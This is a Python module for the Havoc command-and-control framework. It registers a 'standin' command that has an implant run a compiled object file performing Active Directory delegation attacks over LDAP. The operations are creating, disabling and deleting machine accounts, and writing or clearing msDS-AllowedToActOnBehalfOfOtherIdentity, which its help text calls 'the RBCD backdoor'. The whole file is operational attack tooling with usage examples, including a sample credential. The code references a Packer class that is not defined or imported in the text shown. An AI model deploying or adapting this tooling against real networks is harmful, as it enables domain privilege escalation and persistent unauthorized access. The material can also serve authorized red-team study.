from havoc import Demon, RegisterCommand, RegisterModule


def _parse_flags(param, flags):
    """Parse space-split tokens into a dict of flag-name -> value.
    Supports '--flag value' and '--flag=value'."""
    values = {name: spec[1] for name, spec in flags.items()}
    i = 0
    while i < len(param):
        p = param[i]
        matched = None
        for name in flags:
            if p == name or p.startswith(name + "="):
                matched = name
                break
        if matched is None:
            i += 1
            continue

        if p == matched:
            if i + 1 >= len(param):
                return values, f"flag {matched} requires a value"
            val = param[i + 1]
            i += 2
        else:
            val = p.split("=", 1)[1]
            i += 1

        values[matched] = val

    return values, None


def standin_cmd(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    flags = {
        "--computer": (str, ""),
        "--sid":      (str, ""),
        "--domain":   (str, ""),
        "--user":     (str, ""),
        "--pass":     (str, ""),
    }
    values, err = _parse_flags(param, flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    computer = values["--computer"]
    sid      = values["--sid"]
    domain   = values["--domain"]
    user     = values["--user"]
    passw    = values["--pass"]

    # Determine the operation from the boolean flags.
    bools = [p for p in param if p == "--make" or p == "--disable" or p == "--delete" or p == "--remove"]
    if "--make" in bools:
        mode, opname = 0, "create machine account"
    elif "--disable" in bools:
        mode, opname = 1, "disable machine account"
    elif "--delete" in bools:
        mode, opname = 2, "delete machine account"
    elif sid:
        mode, opname = 3, "set msDS-AllowedToActOnBehalfOfOtherIdentity"
    elif "--remove" in bools:
        mode, opname = 4, "remove msDS-AllowedToActOnBehalfOfOtherIdentity"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage:\n"
            "  standin --computer <name> --make\n"
            "  standin --computer <name> --disable\n"
            "  standin --computer <name> --delete\n"
            "  standin --computer <name> --sid <SID>\n"
            "  standin --computer <name> --remove\n"
            "  [--domain <d> --user <u> --pass <p>]")
        return False

    if not computer:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--computer is required")
        return False

    if mode == 3 and not sid:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--sid is required for the RBCD set operation")
        return False

    packer.addint(mode)
    packer.addstr(computer)
    packer.addstr(sid)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(passw)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {opname} '{computer}'")
    demon.InlineExecute(TaskID, "go", "bin/standin.x64.o", packer.getbuffer(), False)
    return TaskID


STANDIN_HELP = (
    "Resource-Based Constrained Delegation (RBCD) primitives, ported from\n"
    "FuzzySecurity/StandIn. Manipulates machine accounts over LDAP.\n"
    "\n"
    "USAGE:\n"
    "  standin --computer <name> --make\n"
    "      Create a machine account (objectClass=Computer, sAMAccountName,\n"
    "      userAccountControl=4096, dnsHostName, SPNs, unicodePwd).\n"
    "      Subject to ms-DS-MachineAccountQuota (default 10).\n"
    "  standin --computer <name> --disable\n"
    "      Set ACCOUNTDISABLE (userAccountControl |= 0x2).\n"
    "  standin --computer <name> --delete\n"
    "      Subtree-delete the machine object.\n"
    "  standin --computer <name> --sid <SID>\n"
    "      Write msDS-AllowedToActOnBehalfOfOtherIdentity granting <SID>\n"
    "      the allowed-to-act right (the RBCD backdoor).\n"
    "  standin --computer <name> --remove\n"
    "      Clear msDS-AllowedToActOnBehalfOfOtherIdentity.\n"
    "\n"
    "OPTIONAL (alternate credentials / target domain):\n"
    "  --domain <d>  Domain (NetBIOS or DNS). Selects the DC; with --user/\n"
    "                --pass it is also the credential domain.\n"
    "  --user <u>    Username for the LDAP bind.\n"
    "  --pass <p>    Password for the LDAP bind.\n"
    "\n"
    "EXAMPLES:\n"
    "  standin --computer Innsmouth --make\n"
    "  standin --computer Innsmouth --make --domain redhook --user RFludd --pass 'Cl4vi$Alchemi4e'\n"
    "  standin --computer Arkham --disable\n"
    "  standin --computer Danvers --delete\n"
    "  standin --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543\n"
    "  standin --computer Miskatonic --remove\n"
)

RegisterCommand(standin_cmd, "", "standin", STANDIN_HELP, 0,
                "--computer <name> (--make|--disable|--delete|--sid <SID>|--remove)",
                "--computer Innsmouth --make")
